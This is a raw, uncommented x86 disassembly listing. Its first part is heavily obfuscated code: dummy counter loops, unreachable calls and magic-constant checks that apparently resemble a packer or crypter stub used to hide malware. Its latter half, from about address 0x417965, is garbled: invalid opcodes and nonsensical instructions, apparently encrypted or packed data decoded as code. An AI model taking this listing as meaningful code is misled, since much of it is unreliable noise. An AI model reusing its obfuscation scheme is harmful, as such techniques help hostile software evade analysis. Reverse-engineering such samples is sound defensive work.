  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429ec5
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x42fa3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x42fa40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x42fa0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x42fa44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x42fa10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x42fa14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x42fa48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     dh,al
  417972:	(bad)  
  417973:	cli    
  417974:	dec    eax
  417975:	test   BYTE PTR [eax-0x63178486],bh
  41797b:	jnp    0x4179f8
  41797d:	or     edi,DWORD PTR ds:0xa3ae2ff8
  417983:	(bad)  
  417984:	sahf   
  417985:	xor    al,0x9a
  417987:	push   ecx
  417988:	imul   edi,DWORD PTR [edx+0x14],0x5a
  41798c:	aas    
  41798d:	mov    al,0x8d
  41798f:	(bad)  
  417990:	push   ss
  417991:	mov    edi,0xaa33966c
  417996:	xchg   DWORD PTR [esi],edx
  417998:	pop    ebp
  417999:	das    
  41799a:	lds    ecx,FWORD PTR [ebp+ebx*8+0x41]
  41799e:	stos   DWORD PTR es:[edi],eax
  41799f:	aas    
  4179a0:	xor    ch,dl
  4179a2:	inc    DWORD PTR [ebp-0x7c]
  4179a5:	push   cs
  4179a6:	not    DWORD PTR [edi]
  4179a8:	push   ebx
  4179a9:	push   ecx
  4179aa:	fmul   QWORD PTR [eax-0x4b]
  4179ad:	mov    cl,bl
  4179af:	ds jl  0x41796d
  4179b2:	pusha  
  4179b3:	stc    
  4179b4:	lods   al,BYTE PTR ds:[esi]
  4179b5:	cld    
  4179b6:	cld    
  4179b7:	mov    ah,0x67
  4179b9:	fcomp  DWORD PTR [eax+0x9e3a8d5]
  4179bf:	cmc    
  4179c0:	add    ebx,DWORD PTR [eax+ecx*2+0x52]
  4179c4:	cld    
  4179c5:	pop    eax
  4179c6:	test   BYTE PTR [ecx],bh
  4179c8:	test   eax,0x9b9939f
  4179cd:	dec    eax
  4179ce:	shl    dh,1
  4179d0:	repnz push ds
  4179d2:	out    dx,al
  4179d3:	sbb    BYTE PTR [edx-0x7957464c],al
  4179d9:	lock fdiv st,st(3)
  4179dc:	test   BYTE PTR [eax+0x15],dh
  4179df:	aaa    
  4179e0:	mov    ecx,0x5bc0afca
  4179e5:	mov    edx,0x598f8d74
  4179ea:	and    BYTE PTR [ebx+0x75],ah
  4179ed:	mov    ebx,0x11346e0e
  4179f2:	ja     0x41798b
  4179f4:	add    eax,0xc54ccd56
  4179f9:	push   eax
  4179fa:	dec    BYTE PTR [ecx-0x74661d0e]
  417a00:	enter  0x7198,0x2f
  417a04:	stos   BYTE PTR es:[edi],al
  417a05:	xchg   ebp,eax
  417a06:	jmp    0xfe7a0a66
  417a0b:	cdq    
  417a0c:	fadd   st(4),st
  417a0e:	push   esp
  417a0f:	adc    eax,esi
  417a11:	call   0xce1860cd
  417a16:	mov    es,ebp
  417a18:	xchg   ecx,eax
  417a19:	pop    eax
  417a1a:	mov    ch,0xe7
  417a1c:	out    dx,eax
  417a1d:	xlat   BYTE PTR ds:[ebx]
  417a1e:	test   BYTE PTR [ecx+0x37d9481],ch
  417a24:	arpl   di,si
  417a26:	and    ebx,eax
  417a28:	push   ecx
  417a29:	outs   dx,BYTE PTR ds:[esi]
  417a2a:	(bad)  
  417a2b:	pushf  
  417a2c:	nop
  417a2d:	mov    eax,ds:0x8416fedd
  417a32:	cdq    
  417a33:	jns    0x4179f0
  417a35:	and    al,0x89
  417a37:	sub    esp,ebp
  417a39:	inc    eax
  417a3a:	dec    edi
  417a3b:	push   0xffffffa9
  417a3d:	or     bh,cl
  417a3f:	clc    
  417a40:	mov    ebp,0x99d4c63f
  417a45:	dec    ebx
  417a46:	xchg   edi,eax
  417a47:	cmp    eax,0x47621de5
  417a4c:	cmp    esp,ebp
  417a4e:	call   0xaa25b85c
  417a53:	ficom  DWORD PTR [edx]
  417a55:	(bad)  
  417a56:	stos   BYTE PTR es:[edi],al
  417a57:	mov    eax,0xce04c7ab
  417a5c:	xor    eax,0x3cfc43f4
  417a61:	pop    ds
  417a62:	or     al,0x30
  417a64:	mov    dh,BYTE PTR [eax]
  417a66:	ss mov ah,0x3d
  417a69:	lea    esi,[edx-0x7d]
  417a6c:	aad    0xab
  417a6e:	mov    al,ds:0x8fd9c613
  417a73:	dec    ecx
  417a74:	inc    ebx
  417a75:	and    al,0xc7
  417a77:	pop    ebp
  417a78:	(bad)  
  417a79:	inc    esp
  417a7b:	xchg   esp,eax
  417a7c:	inc    ebp
  417a7d:	mov    BYTE PTR [edx],dh
  417a7f:	pushf  
  417a80:	or     eax,0x5209ef1f
  417a85:	push   edi
  417a86:	je     0x417a2d
  417a88:	xor    dh,dl
  417a8a:	xchg   BYTE PTR [esi-0x18529a83],cl
  417a90:	pop    ecx
  417a91:	adc    al,0x38
  417a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a94:	cli    
  417a95:	in     eax,0xeb
  417a97:	rcl    DWORD PTR [esi],0x2c
  417a9a:	fmul   QWORD PTR [edi-0x40]
  417a9d:	inc    esp
  417a9e:	push   ss
  417a9f:	gs pushf 
  417aa1:	xor    eax,0xf4f3024d
  417aa6:	jmp    0x417a28
  417aa8:	aad    0xd4
  417aaa:	bound  eax,QWORD PTR [esi-0x6d]
  417aad:	xchg   BYTE PTR [ebx],cl
  417aaf:	in     eax,dx
  417ab0:	into   
  417ab1:	mov    dh,0xc3
  417ab3:	in     eax,0xb
  417ab5:	outs   dx,BYTE PTR ds:[esi]
  417ab6:	pop    esp
  417ab7:	dec    edx
  417ab8:	jl     0x417ad1
  417aba:	jmp    0x8556:0x3b87520e
  417ac1:	adc    bh,BYTE PTR [ebx-0x4011f9f2]
  417ac7:	shl    BYTE PTR [ecx+0x769602de],cl
  417acd:	mov    ds:0xdc6b805,al
  417ad2:	shl    BYTE PTR [eax+ebp*8+0x3b],1
  417ad6:	out    0xae,eax
  417ad8:	adc    DWORD PTR [edi-0x2d],esi
  417adb:	ins    DWORD PTR es:[edi],dx
  417adc:	inc    ecx
  417add:	dec    edi
  417ade:	cwde   
  417adf:	out    dx,eax
  417ae0:	rcr    DWORD PTR [ebp+0x5adb1905],cl
  417ae6:	inc    eax
  417ae7:	jge    0x417b14
  417ae9:	test   eax,0xc0f1dc7e
  417aee:	scas   eax,DWORD PTR es:[edi]
  417aef:	or     eax,DWORD PTR ds:0x1a6081c9
  417af5:	or     al,0x27
  417af7:	pop    ecx
  417af8:	cld    
  417af9:	cwde   
  417afa:	iret   
  417afb:	adc    DWORD PTR [edi],edi
  417afd:	mov    eax,ebp
  417aff:	ds sub dl,ch
  417b02:	dec    edi
  417b03:	or     esi,DWORD PTR [ebx+0x67]
  417b06:	adc    esi,DWORD PTR [ecx]
  417b08:	xor    eax,0x6c1348eb
  417b0d:	cdq    
  417b0e:	das    
  417b0f:	iret   
  417b10:	push   ebx
  417b11:	sbb    al,0x97
  417b13:	sub    eax,0x333fccdd
  417b18:	(bad)  
  417b19:	sahf   
  417b1a:	cmp    ch,BYTE PTR [ebp-0xcc6d62e]
  417b20:	mov    ds:0x20e325e,eax
  417b25:	push   ecx
  417b26:	fcomp  st(4)
  417b28:	mov    ch,0x57
  417b2a:	or     DWORD PTR [edi+0xfb1a35e],ecx
  417b30:	ds in  eax,0x66
  417b33:	out    0xd,eax
  417b35:	inc    ecx
  417b36:	clc    
  417b37:	jle    0x417b77
  417b39:	es pop ebx
  417b3b:	jle    0x417af5
  417b3d:	sahf   
  417b3e:	push   es
  417b3f:	lods   al,BYTE PTR ds:[esi]
  417b40:	pop    ds
  417b41:	push   edi
  417b42:	push   ss
  417b43:	add    cl,BYTE PTR [ebp+0x7f971205]
  417b49:	rol    DWORD PTR [edx+0x3a],1
  417b4c:	aad    0xf5
  417b4e:	cmp    eax,0x6f3f7003
  417b53:	sub    eax,0xafa6e052
  417b58:	inc    esp
  417b59:	mov    al,0xf
  417b5b:	iret   
  417b5c:	and    al,0x9f
  417b5e:	mov    bh,0x88
  417b60:	addr16 out 0x6f,al
  417b63:	adc    ah,BYTE PTR [esi]
  417b65:	js     0x417bb8
  417b67:	idiv   DWORD PTR [esi+0x25]
  417b6a:	and    eax,0x5d210a42
  417b6f:	fisttp QWORD PTR [eax+0x59673e3f]
  417b75:	push   edi
  417b76:	neg    BYTE PTR [ebp+0x12]
  417b79:	js     0x417bdd
  417b7b:	inc    edi
  417b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b7d:	sub    BYTE PTR [edi+0x79],dh
  417b80:	sub    eax,0xad9e2e16
  417b85:	xor    DWORD PTR [esp+esi*8+0x54c14f84],ebp
  417b8c:	in     eax,dx
  417b8d:	seto   BYTE PTR [edx]
  417b90:	push   eax
  417b91:	(bad)  
  417b93:	fidiv  WORD PTR [ebx+0x681aeac2]
  417b99:	mov    DWORD PTR [eax-0x76],eax
  417b9c:	ins    DWORD PTR es:[edi],dx
  417b9d:	xchg   ebx,eax
  417b9e:	push   edi
  417b9f:	or     BYTE PTR [ecx-0x528b10ea],0xcf
  417ba6:	daa    
  417ba7:	jnp    0x417c0e
  417ba9:	pop    esi
  417baa:	push   esp
  417bab:	loope  0x417b91
  417bad:	outs   dx,DWORD PTR ds:[esi]
  417bae:	inc    ebp
  417baf:	push   eax
  417bb0:	xor    BYTE PTR [ebx],al
  417bb2:	call   0x15bf:0x5605676d
  417bb9:	pushf  
  417bba:	pop    ecx
  417bbb:	push   ecx
  417bbc:	adc    cl,bh
  417bbe:	dec    edi
  417bbf:	loopne 0x417c1f
  417bc1:	(bad)  
  417bc3:	icebp  
  417bc4:	ds out 0xaa,al
  417bc7:	xor    al,0xdd
  417bc9:	jmp    0x75a67e36
  417bce:	pop    ecx
  417bcf:	push   ebp
  417bd0:	int    0xc9
  417bd2:	jno    0x417c50
  417bd4:	cli    
  417bd5:	sub    eax,0xf827b536
  417bda:	fidivr DWORD PTR [edx+ecx*8-0x5e27ff24]
  417be1:	dec    esp
  417be2:	loopne 0x417bfc
  417be4:	hlt    
  417be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417be6:	push   es
  417be7:	add    edi,edi
  417be9:	sub    DWORD PTR [edx+0x55cbc2d1],edx
  417bef:	xor    DWORD PTR [edx],esp
  417bf1:	fwait
  417bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bf3:	mov    DWORD PTR [edi+0xe],ecx
  417bf6:	add    edx,DWORD PTR [ecx-0x56]
  417bf9:	sbb    BYTE PTR [edx-0x7e],dl
  417bfc:	(bad)  
  417bfd:	jne    0x417b8c
  417bff:	repnz sbb edi,DWORD PTR [edx-0x7604efae]
  417c06:	repz iret 
  417c08:	std    
  417c09:	lock inc ebp
  417c0b:	addr16 mov ah,0xe
  417c0e:	jle    0x417bb6
  417c10:	fld    TBYTE PTR [esi]
  417c12:	ror    BYTE PTR [ecx-0x5],0x42
  417c16:	dec    esp
  417c17:	dec    ebx
  417c18:	fwait
  417c19:	jle    0x417c12
  417c1b:	in     eax,dx
  417c1c:	fldcw  WORD PTR [eax]
  417c1e:	mov    dh,0x60
  417c20:	nop
  417c21:	fcomp  st(7)
  417c23:	mov    al,ds:0xde03e6fd
  417c28:	(bad)  
  417c29:	stos   DWORD PTR es:[edi],eax
  417c2a:	mov    ah,BYTE PTR ds:0xf87ecac3
  417c30:	and    dh,ch
  417c32:	and    eax,0xd1d4a664
  417c37:	addr16 xchg edi,eax
  417c39:	or     al,0x4b
  417c3b:	push   ebx
  417c3c:	xor    bl,bh
  417c3e:	push   0xffffffe8
  417c40:	xchg   ebx,eax
  417c41:	xchg   edx,eax
  417c42:	hlt    
  417c43:	lock daa 
  417c45:	jmp    0x417bf8
  417c47:	rcr    DWORD PTR [edi+ebx*2],cl
  417c4a:	arpl   WORD PTR [esi+0xb179d2b],dx
  417c50:	dec    cx
  417c52:	stos   DWORD PTR es:[edi],eax
  417c53:	int    0x56
  417c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c56:	cdq    
  417c57:	retf   0xa67c
  417c5a:	fucom  st(3)
  417c5c:	call   0xdde2:0x5ebb6849
  417c63:	lahf   
  417c64:	mov    esp,0x7e3619c
  417c69:	mov    bl,0x4b
  417c6b:	pop    ds
  417c6c:	dec    ebp
  417c6d:	adc    DWORD PTR [edi+0x28],ebp
  417c70:	pop    es
  417c71:	xchg   DWORD PTR [esi-0xe],esi
  417c74:	in     al,0x4d
  417c76:	xchg   BYTE PTR [edx+0x4b],al
  417c79:	dec    edi
  417c7a:	jne    0x417cef
  417c7c:	push   0x27
  417c7e:	mov    dl,0xf
  417c80:	mov    WORD PTR [ecx-0x21eaaf15],ds
  417c86:	sbb    bl,BYTE PTR [ebx+0x75bda86b]
  417c8c:	mov    DWORD PTR [edi+0x6899afd5],esp
  417c92:	lock mov ebp,0xf9d2ce48
  417c98:	adc    esi,DWORD PTR [ebp-0x1a4bd05c]
  417c9e:	int3   
  417c9f:	mov    edx,cs
  417ca1:	add    ebp,DWORD PTR [edi-0x70]
  417ca4:	push   ebp
  417ca5:	call   0xcd8a9c7b
  417caa:	xchg   edi,eax
  417cab:	fpatan 
  417cad:	test   edx,0xf50f3136
  417cb3:	in     eax,dx
  417cb4:	int3   
  417cb5:	ins    BYTE PTR es:[edi],dx
  417cb6:	push   edi
  417cb7:	xchg   edi,eax
  417cb8:	pop    esp
  417cb9:	inc    esi
  417cba:	int3   
  417cbb:	fadd   st(6),st
  417cbd:	sub    BYTE PTR [eax],al
  417cbf:	sbb    bl,BYTE PTR [eax]
  417cc1:	cmp    ebp,ecx
  417cc3:	or     eax,0x6901bd2f
  417cc8:	fcmovu st,st(2)
  417cca:	mov    bh,BYTE PTR [edx]
  417ccc:	ins    BYTE PTR es:[edi],dx
  417ccd:	push   0x17
  417ccf:	fisub  DWORD PTR [ebp+0x52]
  417cd2:	mov    eax,DWORD PTR [ecx]
  417cd4:	loop   0x417d05
  417cd6:	sbb    cl,BYTE PTR [ebx]
  417cd8:	cmp    eax,0x8e35ac5
  417cdd:	jmp    0x95ee:0x86a41aa
  417ce4:	push   0xffffffb6
  417ce6:	fisttp DWORD PTR [edx-0x4f]
  417ce9:	jbe    0x417cfe
  417ceb:	xor    esi,ecx
  417ced:	mov    ds:0x4d275cb0,eax
  417cf2:	aas    
  417cf3:	std    
  417cf4:	mov    edi,0xd682be2f
  417cf9:	lea    eax,[edx-0x4c]
  417cfc:	adc    esp,DWORD PTR [eax]
  417cfe:	and    eax,0x714ed44f
  417d03:	popa   
  417d04:	das    
  417d05:	fidivr DWORD PTR [ebx+0x16]
  417d08:	(bad)  
  417d09:	fsubr  DWORD PTR [edx-0x14316b59]
  417d0f:	imul   ebp,esp,0x7e
  417d12:	mov    eax,ds:0xffb7976c
  417d17:	push   ecx
  417d18:	add    al,0xc9
  417d1a:	mov    esi,0x17cc7a11
  417d1f:	jnp    0x417d04
  417d21:	mov    ch,0xaa
  417d23:	xor    al,0x6f
  417d25:	fcomp  st(4)
  417d27:	ins    DWORD PTR es:[edi],dx
  417d28:	mov    ecx,0x6473442
  417d2d:	add    ecx,DWORD PTR [edi+0x36c133e0]
  417d33:	shl    BYTE PTR [ebx-0x5861385f],1
  417d39:	popa   
  417d3a:	sbb    eax,0x1c3e1eab
  417d3f:	dec    ebx
  417d40:	cmp    BYTE PTR [eax],0x5f
  417d43:	mov    dl,0xa3
  417d45:	repnz xchg esi,eax
  417d47:	out    0x49,eax
  417d49:	out    dx,al
  417d4a:	scas   al,BYTE PTR es:[edi]
  417d4b:	mov    edx,gs
  417d4d:	cli    
  417d4e:	sub    DWORD PTR [ecx-0x375c36cc],edi
  417d54:	cli    
  417d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d56:	inc    edx
  417d57:	imul   edi,DWORD PTR [ebx-0x68],0xffffffa6
  417d5b:	pushf  
  417d5c:	scas   eax,DWORD PTR es:[edi]
  417d5d:	std    
  417d5e:	in     al,dx
  417d5f:	xchg   esp,eax
  417d60:	retf   
  417d61:	rol    DWORD PTR [esi+eiz*1],cl
  417d64:	push   edx
  417d65:	sub    edx,ebx
  417d67:	sub    ecx,esi
